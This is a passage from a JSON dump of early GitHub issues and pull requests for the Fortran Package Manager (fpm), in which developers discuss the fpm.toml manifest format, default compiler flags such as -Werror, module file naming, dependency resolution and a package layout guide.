            "date": "2020-04-29 14:38:17+00:00",
            "title": "fpm run and fpm test should emit a message if no action is taken",
            "text": "Currently, if you issue fpm run in a library project without executable program, it does nothing.\nIt'd be more user friendly if we emitted a message to stderr, something like:\nfpm: This package has no executable programs.\n\nor similar.\nLikewise for fpm test. If there are no test, we should say something like:\nfpm: This package has no tests.\n\nWhat do you think?",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 14:39:43+00:00",
                    "text": "Not a bad idea. Shouldn't be too difficult to implement."
                }
            ]
        },
        {
            "number": 63,
            "user": "milancurcic",
            "date": "2020-04-29 14:34:01+00:00",
            "title": "Don't require compiler field in fpm.toml",
            "text": "Following up on the discussion in #60, let's remove the requirement for the compiler setting in the package-specific fpm.toml.\nFor now, FPM should default to gfortran, and we can put a note in the README or the packaging guide that gfortran is currently the only compiler supported. We can relax this at a later time. The compiler setting can still remain in the toml parser as optional--perhaps we will want to allow package-specific choice of compiler.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 14:41:04+00:00",
                    "text": "That's reasonable for now. I'll make that change on my PR"
                }
            ]
        },
        {
            "number": 62,
            "user": "everythingfunctional",
            "date": "2020-04-29 02:55:30+00:00",
            "title": "Handling Dependencies",
            "text": "My basic outline of how to do this is the following recursive algorithm:\n\nfor each listed dependency, download/check it out\nGo into the dependency's fpm.toml file and for each of it's dependencies\na. if it's already been downloaded, check that it's version is compatible, otherwise recursively repeat this process\nCollect each of the dependencies dependencies,\nReturn the tree of dependencies\nBuild each of the dependencies, recursively building each of it's dependencies first",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 02:58:57+00:00",
                    "text": "I should be able to implement this soon. I'll use a similar toml specification style as Rust's cargo. I got sidetracked implementing the ability to parse that properly for the toml parser we're using.\nWhich brings up a question. Do we specify the specific git version of that library as one of our dependencies, or do we include the functions I implemented directly in our source? For either, at some point we'll be able to remove it and go back to using the library as normal."
                },
                {
                    "user": "LKedward",
                    "date": "2020-04-29 08:17:58+00:00",
                    "text": "Thanks @everythingfunctional, this will be great to get working! I have a few questions:\n\nAt this stage are dependencies simply specified directly as git repository urls (#33 decentralized package management)?\nAre you using git tags to track specific versions in git repositories?\nHow are dependency versions specified in fpm.toml? (cargo supports several version operators)\nAre you adopting some form of semantic versioning rules to resolve version compatibility?\n\nAlso: surely you can only resolve compatible dependency versions after the entire dependency tree has been constructed?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 14:30:29+00:00",
                    "text": "For now, we'll just support git repository urls, since we don't have a centralized repo yet.\nJust like cargo does, we'll support tags, commits, or branches being specified for a git dependency.\nI'm planning to implement version specifications exactly like cargo does. That's a bit longer term goal though.\nYes, we'll adopt semantic versioning rules. Long term, it may even be possible to enforce those rules in a centralized repository.\nIn the short term, we won't \"resolve\" dependency versions. It will just check if the version already downloaded is compatible with the package's requirements. If not we'll just throw an error. You can then \"resolve\" the conflict by specifying a version that works for all the dependencies in your package. I don't know of any package manager that has really and truly solved the version compatibility search problem. Many have just reasonable approximations or workarounds."
                }
            ]
        },
        {
            "number": 61,
            "user": "milancurcic",
            "date": "2020-04-28 20:52:11+00:00",
            "title": "add license",
            "text": "FPM needs a license.\nMIT seems a no-brainer here, but need permission from contributors.",
            "comments": []
        },
        {
            "number": 60,
            "user": "milancurcic",
            "date": "2020-04-28 20:47:08+00:00",
            "title": "Package layout guide",
            "text": "First stab at describing package layout and examples.\nI took the user guide approach rather than a specification document because:\n\nIt's impossible to separate package layout specification (output of tree) and fpm.toml specification; they are interdependent;\nIt's impossible to predict the exact specification that we'll need; in other words, we need to work up to it;\nBy writing this out as a user guide, I had to learn it enough to teach it. This process illustrates what's missing and what's working or not working. We should take it step by step from there.\nWe want users to try to adapt their package to FPM and open issues with what doesn't work or is unclear.\n\nPlease read it and let me know any suggestions, or edit the document directly.\nYou'll see that I asked one question and proposed two issue candidates in quotation blocks (>). We should remove them and open issues before merging this.\nEverything covered in the guide works with current master of FPM, except a few details about fpm.toml settings that aren't implemented.\nI also need to say, even at this early and raw stage it's pleasure using FPM. Doing something like this with Fortran code is already pushing the boundary. So, great work @everythingfunctional and @certik.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-04-28 21:06:59+00:00",
                    "text": "Thanks @milancurcic for writing a tutorial for this. Very helpful. It looks great overall and I don't have any issues with it, except one big one: I strongly feel we should not be encoding compiler options into fpm.toml and so we should not be encouraging users to do so. In the same way, we should not be encoding standard layout into fpm.toml either. FPM should allow both as an option, but by default it would do the right thing.\nSo in particular, none of this should be there:\ncompiler = \"gfortran\"\ndevel-options = [\"-g\", \"-Wall\", \"-Wextra\", \"-pedantic\"]\nrelease-options = [\"-O3\"]\n\n[executables.executable-name]\nmain = \"main.f90\"\nsource-dirs = \"app\"\nlinker-options = [\"-O3\"]\n\nThis should be all inferred automatically. Exactly as Cargo works.\nI think fpm might not be able to do it yet. That is fine, but in that case I would like to see very clearly stated that this is temporary and show how the fpm.toml will look like once we implement this."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-28 21:31:39+00:00",
                    "text": "@certik I agree. What I think makes most sense is:\n\nfpm has default behavior baked in\n(optional) compiler can be changed on fpm level (not the package level)\n(optional) some packages may need to override default compiler flags, but I assume this is minority of packages.\n\nIt turns out, right now fpm doesn't require any of this except compiler. So even for the last example, this is a valid fpm.toml:\nname = \"math_constants\"\nversion = \"0.1.0\"\nlicense = \"MIT\"\nauthor = \"Jane Programmer\"\nmaintainer = \"jane@example.com\"\ncopyright = \"2020 Jane Programmer\"\ndependencies = []\ncompiler = \"gfortran\"\nSo I can go right ahead and remove the other settings from examples. That will also make the tutorial simpler.\nAs for the compiler setting, it seems like it would be straighforward for @everythingfunctional to hardcode it for now. I think that's a reasonable temporary solution."
                },
                {
                    "user": "certik",
                    "date": "2020-04-28 21:56:15+00:00",
                    "text": "fpm can optionally allow setting the compiler + options both at the package level (fpm.toml) as well as the fpm level (command line options / configure file such as ~/.fpmconfig).\nIdeally most packages will not specify either, just use the default as in your tutorial (I agree we should remove the gfortran that is currently still hardwired in fpm.toml even though clearly those examples would compile with any Fortran compiler). That way getting all packages working with a new compiler (say Flang or LFortran later on) would be trivial --- just add support for those compilers into fpm.\nOnly packages that truly require some special handling in compilers should do so --- and even then we should try to see what special handling they require. I've seen that some old f77 code requires the -std=legacy gfortran option. In that case I would suggest to not make them gfortran specific, but rather introduce a legacy=true fpm option (or in this case std=f77, std=f2018, ...), that would (in principle) work with any Fortran compiler and fpm would figure out what options must be set for each compiler."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-29 02:16:23+00:00",
                    "text": "This looks really good. I haven't read all the way through it yet, but I did notice a few inconsistencies with how I actually finished implementing all the toml options. I suggest we go ahead and merge this though, and then I'll fix any inconsistencies on my branch before we merge it. I should be able to do that within the next few days.\nI'll note that while in my implementation the compiler flags are hard coded, the compiler actually isn't. I suspect in the short term we'll pick different hard coded flags based on the compiler specified, and long term we'll come up with a compiler agnostic way of specifying special flags needed for a given project."
                }
            ]
        },
        {
            "number": 59,
            "user": "milancurcic",
            "date": "2020-04-26 18:46:49+00:00",
            "title": "remove -Werror gfortran flag",
            "text": "Fixes #56",
            "comments": []
        },
        {
            "number": 58,
            "user": "milancurcic",
            "date": "2020-04-26 18:44:47+00:00",
            "title": "Update readme and executable name",
            "text": "This PR:\n\nUpdates install instructions in the README and adds instructions on how to use fpm.\nRenames FPM executable from fpm-exe to fpm.\n\nFixes #55",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-04-28 21:56:01+00:00",
                    "text": "@certik Does this look good? It's a simple PR."
                }
            ]
        },
        {
            "number": 57,
            "user": "milancurcic",
            "date": "2020-04-26 18:18:15+00:00",
            "title": "fpm assumes .mod has the same name as the source file",
            "text": "If I have a source file datetime.f90 that contains a module called datetime_module, then gfortran (and all other compilers I believe) output datetime_module.mod. However, fpm expects datetime.mod and can't find it.\nI believe the assumption about .mod filename comes from somewhere around here, however I don't have a solution right now.\nI think the safe assumption is that the .mod file will have the module name, for fpm will need to scan the source file to get this info.\nFurther, a source file can have multiple modules defined, and for each the compiler will emit one .mod file.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 21:06:21+00:00",
                    "text": "That assumption actually comes from here.\nThe reasoning is that we want the file name to match the module name, and the module name to include the path components of the file name. This was a basic structure to help with organizing modules that @certik and I came up with.\nThere are ways to just inspect the source files and figure out the module names and dependencies more flexibly, but for our initial implementation we wanted to keep things as simple as possible and try and encourage a common organizational convention.\nObviously this is something that should be added to the README. @certik , do you think you'll have time to write up our standard conventions in the README any time soon?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 21:27:04+00:00",
                    "text": "Specifically for datetime-fortran, that's fine. I'm happy to rename the source file so it can build with fpm.\nI also support encouraging the practice one module per source file, with file name matching the module.\nHowever, I think this may be quite limiting if fpm is to build existing packages. I don't know, but it's possible that there are many that have multiple modules per source file.\nThis made me think now: why would there be an expectation for a specific .mod file to be present? AFAIK, the compiler cares only about the include path and that the modules are there. It knows how to find the file in the include directory. So, this requirement by fpm seems artificial to me. Could it be removed so that fpm only checks for .o files? I think it's safe to assume that if .o file is created, that the .mod files have been created as well."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 21:28:26+00:00",
                    "text": "However, I think this may be quite limiting if fpm is to build existing packages. I don't know, but it's possible that there are many that have multiple modules per source file.\n\nRelated to this, I think more problematic is that this requirement would prevent fpm from building correct and modern Fortran code."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-27 04:22:28+00:00",
                    "text": "It's more about rebuilds. If you change a module and rebuild, then if the .mod file changes, you need to rebuild everything that depends on it."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 05:12:55+00:00",
                    "text": "Yes, the default layout restricts what can be done, and you want that. It's not meant as a replacement for cmake, which allows you to do anything, but you pay for it by maintaining a complex buildsystem. We want to rather create a convention, that would allow fpm to figure out everything by itself.\n\nFor existing packages we either have to adapt them, or we need to tell fpm extra information where things are.\n\u2026\nOn Sun, Apr 26, 2020, at 10:22 PM, Brad Richardson wrote:\n\n\n It's more about rebuilds. If you change a module and rebuild, then if\n the .mod file changes, you need to rebuild everything that depends on\n it.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#57 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWBXBCUBJJZTLO54K4LROUCBBANCNFSM4MRK6V2A>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-27 12:27:17+00:00",
                    "text": "Okay, sounds good. We can revisit if it shows to be an issue, I don't think it is right now.\nYes, it'd be good to discuss and write out requirements for packages. I don't remember seeing this specific one anywhere."
                },
                {
                    "user": "certik",
                    "date": "2020-04-27 15:58:24+00:00",
                    "text": "@milancurcic see #39."
                }
            ]
        },
        {
            "number": 56,
            "user": "milancurcic",
            "date": "2020-04-26 17:59:16+00:00",
            "title": "Correct code fails to build due to hardcoded -Werror",
            "text": "fpm is currently making gfortran fail on warning by hardcoding -Werror. Removing -Werror from fpm.toml doesn't change this behavior (I understand specifying flags via fpm.toml may not be implemented yet.\nHowever, in the meantime, we shouldn't use -Werror because it's making correct code to fail. For example:\n[milan@gary test_project_error]$ cat src/mylib.f90 \nreal :: a, b\na = 2.\nb = 2.\nprint *, a == b\nend\n[milan@gary test_project_error]$ cat fpm.toml \nname = \"package-name\"\nversion = \"0.1.0\"\nlicense = \"BSD3\"\nauthor = \"Author name here\"\nmaintainer = \"example@example.com\"\ncopyright = \"2020 Author name here\"\ndependencies = []\ncompiler = \"gfortran\"\ndevel-options = [\"-g\", \"-Wall\", \"-Wextra\", \"-pedantic\"]\nrelease-options = [\"-O3\"]\n\n[library]\nsource-dirs = \"src\"\n[milan@gary test_project_error]$ fpm build\n# gfortran (for build/debug/library/mylib.o build/debug/library/mylib.mod)\nsrc/mylib.f90:4:8:\n\n print *, a == b\n        1\nError: Equality comparison for REAL(4) at (1) [-Werror=compare-reals]\nf951: all warnings being treated as errors\nfpm-exe: Error when running Shake build system:\n  at want, called at src/Build.hs:188:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/package-name.a\n  at need, called at src/Build.hs:186:13 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/mylib.o\n  at &%>, called at src/Build.hs:166:11 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Depends on: build/debug/library/mylib.o build/debug/library/mylib.mod\n  at cmd, called at src/Build.hs:179:19 in fpm-0.1.0.0-9zFE4ut013U9YSOSmXT3I3:Build\n* Raised the exception:\nDevelopment.Shake.cmd, system command failed\nCommand line: gfortran -c -Jbuild/debug/library -Wall -Wextra -Wimplicit-interface -Werror -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -o build/debug/library/mylib.o src/mylib.f90\nExit code: 1\nStderr:\nsrc/mylib.f90:4:8:\n\n print *, a == b\n        1\nError: Equality comparison for REAL(4) at (1) [-Werror=compare-reals]\nf951: all warnings being treated as errors\n\nWhat do you think?",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-04-26 18:15:42+00:00",
                    "text": "I think Werror is not your friend and should not be used here; especially here where we cannot guarantee a specific compiler version.\nLatest gfortran actually produces spurious warnings for certain derived-type allocations so Werror would completely prevent you from producing a debug build.\n#50"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 21:15:52+00:00",
                    "text": "As I mentioned on the PR, I'm fine with removing the -Werror flag from the default list. But in this instance I will point out that comparison of reals really is a bad idea. Floating point math means that equality will almost surely never be true. For example, I'm pretty sure (1.0 / 3.0) == ((1.0 / 9.0) * 3.0) is false, when you really would expect it to be true."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 21:35:26+00:00",
                    "text": "In most cases, yes, and that's why there should be a warning for it. :)"
                }
            ]
        },
        {
            "number": 55,
            "user": "milancurcic",
            "date": "2020-04-25 17:52:58+00:00",
            "title": "stack build does not add fpm executable to path",
            "text": "First time running stack. On running stack build, it looks like the fpm executable is not installed in any working path. I expected it to be installed either somewhere under stack like pip does, or locally and then added to my path.\nFor example, I'm working in /home/milan/Work/fortran/fpm, fpm-exe is installed here: /home/milan/Work/fortran/fpm/.stack-work/install/x86_64-linux-tinfo6/68e6a00e61079ec9146947ae047a1ce619d26ace12c1e4cd5fd58ceb496743b0/8.6.5/bin\nso I had to add this to my PATH.\nIs this expected behavior? If not, is this an issue with stack or with fpm?\nfpm-exe should be called just fpm.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 17:20:18+00:00",
                    "text": "stack build is not supposed to install the executable. I'll have to try it, but I believe stack install will do what you are after. I think it typically will install it to $HOME/.local/bin."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 18:58:34+00:00",
                    "text": "Thanks, I tested stack install and it works."
                }
            ]
        },
        {
            "number": 54,
            "user": "everythingfunctional",
            "date": "2020-04-14 00:37:36+00:00",
            "title": "Additional testing",
            "text": "Set up and test some example projects",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-22 02:46:11+00:00",
                    "text": "I think this is now sufficient for any project, with no dependencies, on any platform. But please feel free to put it through the ringer and let me know if you find anything."
                },
                {
                    "user": "certik",
                    "date": "2020-04-22 03:54:13+00:00",
                    "text": "Thanks @everythingfunctional. I'll test it out soon. I was really busy with other things lately."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-04-26 19:00:58+00:00",
                    "text": "I just noticed this didn't make it to master yet. I will play with it. So far I worked only with current master."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-26 23:29:17+00:00",
                    "text": "@certik , do you want a chance to test it out, or should I go ahead and merge this?"
                }
            ]
        },
        {
            "number": 53,
            "user": "everythingfunctional",
            "date": "2020-04-11 22:45:31+00:00",
            "title": "Finish commands",
            "text": "Finish the required functionality for a project with no dependencies.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-12 05:15:52+00:00",
                    "text": "Yeah, we should test a variety of setups, with default settings, specified default settings, and non-default settings. I guess my next steps should be to come up those examples."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-13 02:47:40+00:00",
                    "text": "@milancurcic , absolutely."
                },
                {
                    "user": "certik",
                    "date": "2020-04-13 17:40:38+00:00",
                    "text": "Thanks @everythingfunctional for working on this. It's quite difficult for me to contribute to the Haskell code base, as I am still learning it, but I'll be able to greatly help with the test cases --- if you provide some initial tests, I'll submit PRs with more tests."
                }
            ]
        },
        {
            "number": 52,
            "user": "everythingfunctional",
            "date": "2020-04-11 21:46:12+00:00",
            "title": "Finish simple project settings",
            "text": "This finishes up all the necessary settings for a basic simple project",
            "comments": []
        },
        {
            "number": 51,
            "user": "everythingfunctional",
            "date": "2020-03-31 20:50:29+00:00",
            "title": "Two stage settings",
            "text": "This splits the settings for FPM into a two stage process and starts to make use of that for default behavior",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-31 20:53:18+00:00",
                    "text": "The architecture is starting to come together and look reasonable so far. No major changes should be needed from this point to support all 3 commands for a project with no dependencies. I think that will be my next step after this."
                },
                {
                    "user": "certik",
                    "date": "2020-04-04 16:19:42+00:00",
                    "text": "Yes, our goal should be that fpm packages work with all compilers by default. My experience is with larger Fortran codes that they typically work with a few particular compilers but not all, e.g., one of our codes works with Intel and NAG, but not gfortran. I don't know if it makes sense to allow fpm packages to restrict which compilers it works with. But for now I would simply allow all.\n\u2026\nOn Sat, Apr 4, 2020, at 9:33 AM, Milan Curcic wrote:\n\n\n ***@***.**** approved this pull request.\n\n \ud83d\udc4d\n\n Should the compiler choice (e.g. gfortran) be set in fpm.toml? It seems\n to me more appropriate to be a local fpm setting and not a package\n setting. It's okay here for now, just a note for later.\n\n \u2014\n You are receiving this because your review was requested.\n Reply to this email directly, view it on GitHub\n <#51 (review)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWHLSETPQZ5T3WR6ILLRK5HNLANCNFSM4LX72EBA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-04 17:17:08+00:00",
                    "text": "My thought is that the fpm.toml doesn't specify which compilers a package works with, but which compiler is used by default when building that package on its own. When building a package as a dependency for another project I don't expect any settings to be taken from the fpm.toml file except where to find the source files, and what other dependencies are needed. Compiler, flags, any other relevant settings would be set by the parent project and be in effect for building all dependencies."
                }
            ]
        },
        {
            "number": 50,
            "user": "everythingfunctional",
            "date": "2020-03-30 15:20:37+00:00",
            "title": "Compiler flags",
            "text": "How should we organize/specify compiler flags?\nShould we only have two sets of compiler flags? devel-options and release-options, and they are used to build all dependencies and executables?\nAlso, should we come up with our own keywords for specifying the compiler options, and have a look up table to determine the correct flag for each compiler?",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-03-30 16:29:04+00:00",
                    "text": "We will have to iterate on this, I don't know all the details either yet. Here are some guiding principles:\n\nWe should have Debug and Release builds. (I would call it Debug, not Devel.)\nPerhaps also ReleaseCheck (that would enable all optimizations, but keep all runtime checks; it could be named differently, perhaps ReleaseSafe, or something).\n\nThe Debug build should enable all runtime and compile time checks / warnings that a given compiler allows. The Release build should make the fastest build for the given architecture. For ifort I think that's the default (i.e. no options). For gfortran that's -O3 -march=native -ffast-math -funroll-loops (the later gfortran versions also have -Ofast which does a lot of these and a few more --- so we should look into it and probably use it).\nSo as a start, I would start with Debug and Release. Then as we go, we can keep refining it.\nWe can take the initial options for gfortran / Intel from here:\nhttps://www.fortran90.org/src/faq.html#what-compiler-options-should-i-use-for-development\nhttps://www.fortran90.org/src/faq.html#what-compiler-options-should-i-use-for-production-run"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-30 19:07:49+00:00",
                    "text": "Those are good suggestions for defaults. But I'm more talking about what we want to allow users to specify.\nShould we only allow users to specify a single set of compiler flags for each of debug and release modes? Or should there be some more granularity available? Different flags for executables vs libraries?\nAlso, when a user specifies compiler flags manually, should they specify the flags directly (i.e. \"-funroll-loops\") or with a more generic option that looks up the specific flag for the given compiler?"
                },
                {
                    "user": "certik",
                    "date": "2020-03-30 21:22:45+00:00",
                    "text": "Ah I see. I would definitely allow to specify any compiler flag to any file and any executable / library. That way it should be possible to build any project out there. It's just that we want to discourage users doing that obviously, but we should allow that.\nRegarding \"generic options\" like \"unroll loops\" for \"-funroll-loops`, I would not do that, because I think it will be very hard to find such options for every compiler. Initially the only generic options that I would allow are Debug / Release / ReleaseSafe. Later on, we can perhaps add more, if users request them.\nSo for example, the user can select Debug mode that would be applied to every file, except those that the user specifically sets manually."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-30 21:49:28+00:00",
                    "text": "Ok, that's definitely going to have to take some thinking about how to design on both the fpm.toml side, and the actual build process side."
                },
                {
                    "user": "certik",
                    "date": "2020-03-30 21:54:46+00:00",
                    "text": "We should not over design this. Right now we are just writing a prototype, to help us figure out the requirements, because what you are asking for are the requirements which we do not know yet, until we gain more experience using fpm with actual Fortran codebases."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-31 13:52:31+00:00",
                    "text": "You're right. I'm just going to leave out the options to specify compiler flags for now. Until we have time to design it properly."
                }
            ]
        },
        {
            "number": 49,
            "user": "everythingfunctional",
            "date": "2020-03-28 18:35:57+00:00",
            "title": "TOML to Settings Architecture",
            "text": "I'm creating this as mostly a reference for how I think we should proceed with having sane defaults to allow minimal fpm.toml files. Right now I'm just reading the toml contents directly into the data structure for the settings for building the project. What I think will make more sense is to have two different data structures. One for reading the settings from the fpm.toml file, and a slightly different one for the settings for the project passed to the rest of the process. This will allow a step for interrogating the file system for some of the defaults based on the presence/absence of information in the fpm.toml file.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:23:55+00:00",
                    "text": "Closing this since it's been implemented this way."
                }
            ]
        },
        {
            "number": 48,
            "user": "everythingfunctional",
            "date": "2020-03-28 18:30:02+00:00",
            "title": "Simplify example project",
            "text": "This simplifies the example project and sets things up to begin building according to the settings read from fpm.toml",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-03-30 21:10:03+00:00",
                    "text": "Thanks!"
                }
            ]
        },
        {
            "number": 47,
            "user": "everythingfunctional",
            "date": "2020-03-24 21:12:17+00:00",
            "title": "Read fpm toml",
            "text": "Start reading the settings for a package from fpm.toml",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-24 21:37:14+00:00",
                    "text": "I've got it reading the first setting from an fpm.toml file. Take a look and let me know what you guys think."
                },
                {
                    "user": "certik",
                    "date": "2020-03-24 22:17:35+00:00",
                    "text": "I think this looks good.\nThis implements explicit layout, which we should support also. Based on our past discussion, by default we would encourage users to use the implicit layout, so they just need to put a file in the bin directory, and fpm will automatically build the binary out of it, just like Cargo."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-25 13:36:18+00:00",
                    "text": "I think this looks good.\nThis implements explicit layout, which we should support also. Based on our past discussion, by default we would encourage users to use the implicit layout, so they just need to put a file in the bin directory, and fpm will automatically build the binary out of it, just like Cargo.\n\nImplicit layout will be a bit trickier to implement I think. The default would be only one executable, with main having the default expected name (probably main.f90).\nAll doable. I think we should start with explicit, make sure that works, then come up with lots of example projects, leaving various things out to allow for defaults."
                },
                {
                    "user": "certik",
                    "date": "2020-03-25 16:14:15+00:00",
                    "text": "Here is our last iteration that we did at the Committee meeting in Vegas:\n#39 (comment)\nAnd to have more executables in the app directory, you just add more subdirectories just like Cargo does it I think."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-03-25 16:39:30+00:00",
                    "text": "I think the purpose of going for an implicit, minimal, sane default is that it can be implemented most quickly. You can then assess what's most needed to generalize next. I prefer this approach to development and we use it at Cloudrun.\nOtherwise, we have to make a lot of assumptions on what are all the options and edge cases that will be desired, and we'd spend a lot of time doing that."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-25 23:03:06+00:00",
                    "text": "With the toml parser I'm using, it's actually easiest to define the data structure that holds all the necessary settings, and require they be present in the toml file. Then we can figure out how to make that setting optional (have a default). Yes we should start with the simplest possible project and the simplest settings, but it actually is easier to make them required first."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-03-25 23:05:47+00:00",
                    "text": "I'm going to merge this in and then take a stab at simplifying the example project and it's toml file to the bare minimum."
                }
            ]
        },
        {
            "number": 46,
            "user": "everythingfunctional",
            "date": "2020-03-13 02:25:57+00:00",
            "title": "Create first draft of an example fpm.yaml file",
            "text": "This is a first shot at what an fpm.yaml file might look like.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-03-13 03:38:04+00:00",
                    "text": "Thanks for trying to figure out what to put in.\nMy view is to do exactly what Rust / Cargo does. In Cargo, you can set many of these options, but by default, you do not, and you follow the layout. And you then tell cargo to build in Release or Debug modes, and Cargo chooses the default options.\nIn our case, I was thinking of following exactly the same approach. That is, fpm will support all Fortran compilers. Which means, the compiler specific options should not be set in fpm.toml, because those would be specific to a compiler, so would not work with another compiler.\nSo I would suggest to simplify your example as follows:\nname:                package-name\nversion:             0.1.0\nlicense:             BSD3\nauthor:              \"Author name here\"\nmaintainer:          \"example@example.com\"\ncopyright:           \"2020 Author name here\"\n\ndependencies: \n- stdlib\n\ntests-dependencies:\n    - vegetables 1.0  # I think in Cargo this means >= 1.0 and < 2.0\nFinally, I would follow Cargo's naming conventions.\nI am going to post a TOML example."
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 03:44:41+00:00",
                    "text": "Here is the TOML equivalent:\n[package]\nname = \"package-name\"\nversion = \"0.1.0\"\nlicense = \"BSD3\"\nauthors = [\"Author name here <example@example.com>\"]\nedition = \"2018\"\n\n[dependencies]\nstdlib = \"0.2.3\"\n\n[dev-dependencies]\nvegetables = \"1.0\""
                },
                {
                    "user": "certik",
                    "date": "2020-03-13 04:00:30+00:00",
                    "text": "For comparison, a literal translation of the YAML to TOML is:\nname = \"package-name\"\nversion = \"0.1.0\"\nlicense = \"BSD3\"\nauthor = \"Author name here\"\nmaintainer = \"example@example.com\"\ncopyright = \"2020 Author name here\"\ndependencies = [\"../std-lib.tar.gz\"]\ncompiler = \"gfortran\"\ndevel-options = [\"-g\", \"-Wall\", \"-Wextra\", \"-Werror\", \"-pedantic\"]\nrelease-options = [\"-O3\"]\n\n[library]\nsource-dirs = \"src\"\n\n[executables.executable-name]\nmain = \"Main.f90\"\nsource-dirs = \"app\"\nlinker-options = [\"-O3\"]\ndependencies = [\"iso_varying_string\"]\n\n[tests.test-name]\nmain = \"Spec.f90\"\nsource-dirs = \"test\"\nlinker-options = [\"-Og\"]\ndependencies = [\"vegetables >= 1.0 && < 2.0\"]\n(But as I said, I think we should simplify some of the sections and follow Rust's naming scheme.)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-11 17:59:46+00:00",
                    "text": "Closing, since we're going with toml"
                }
            ]
        },
        {
            "number": 45,
            "user": "everythingfunctional",
            "date": "2020-03-12 03:08:54+00:00",
            "title": "Package File Spec",
            "text": "We need a specification, or at least a start of one, for what should go into the package file and how it should be organized.\nI'd suggest we start by answering the question \"What does fpm need to know about a package in order to be able to build it?\" in as much detail as possible and then trying to organize it logically.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:24:59+00:00",
                    "text": "I think we've settled this now?"
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 05:25:42+00:00",
                    "text": "Yes.\n\u2026\nOn Wed, Apr 29, 2020, at 9:25 PM, Brad Richardson wrote:\n\n\n I think we've settled this now?\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#45 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWBSCLSYDG6OBIOZH73RPDVRPANCNFSM4LGDENXA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 14:06:16+00:00",
                    "text": "Ok, closing."
                }
            ]
        },
        {
            "number": 44,
            "user": "everythingfunctional",
            "date": "2020-03-12 03:05:20+00:00",
            "title": "toml or yaml or something else",
            "text": "Are we sold on using toml as the file format for a package manifest/configuration file?\nI see that Rust uses toml, but many other package mangers use others. Haskell's Stack uses yaml, and I think I've seen others use that. I think I've also seen json, and maybe even xml.\nA new project Cargo.toml looks like:\n[package]\nname = \"rusttest\"\nversion = \"0.1.0\"\nauthors = [\"Brad Richardson <brichardson@structint.com>\"]\nedition = \"2018\"\n\n# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html\n\n[dependencies]\n\nand a new project package.yaml (for Haskell) looks like:\nname:                haskelltest\nversion:             0.1.0.0\ngithub:              \"githubuser/haskelltest\"\nlicense:             BSD3\nauthor:              \"Author name here\"\nmaintainer:          \"example@example.com\"\ncopyright:           \"2020 Author name here\"\n\nextra-source-files:\n- README.md\n- ChangeLog.md\n\n# Metadata used when publishing your package\n# synopsis:            Short description of your package\n# category:            Web\n\n# To avoid duplicated efforts in documentation and dealing with the\n# complications of embedding Haddock markup inside cabal files, it is\n# common to point users to the README.md file.\ndescription:         Please see the README on GitHub at <https://github.com/githubuser/haskelltest#readme>\n\ndependencies:\n- base >= 4.7 && < 5\n\nlibrary:\n  source-dirs: src\n\nexecutables:\n  haskelltest-exe:\n    main:                Main.hs\n    source-dirs:         app\n    ghc-options:\n    - -threaded\n    - -rtsopts\n    - -with-rtsopts=-N\n    dependencies:\n    - haskelltest\n\ntests:\n  haskelltest-test:\n    main:                Spec.hs\n    source-dirs:         test\n    ghc-options:\n    - -threaded\n    - -rtsopts\n    - 